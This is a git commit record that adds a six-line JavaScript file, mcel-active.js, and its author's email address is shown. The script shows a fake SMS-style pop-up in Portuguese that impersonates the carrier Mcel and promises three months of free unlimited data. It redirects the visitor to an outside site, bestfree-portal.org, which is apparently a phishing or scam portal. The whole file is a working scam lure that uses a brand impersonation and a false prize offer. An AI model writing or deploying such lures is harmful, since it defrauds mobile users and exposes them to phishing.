489811ae75cf0653eedc6d55fe707875731429f2
ebeekpo <imohdavid078@gmail.com>
2025-02-08 08:14:20 +0100

    Create mcel-active.js

---
+++ mcel-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVAR DADOS'
+password=prompt('SMS: Parabéns, você está qualificado para dados gratuitos ilimitados de 3 meses da Mcel. Por favor, pressione OK para ativar agora   ','ATIVAR DADOS');
+if (password != 'ATIVAR DADOS') {
+location.href='https://bestfree-portal.org/mcel.html';
+}
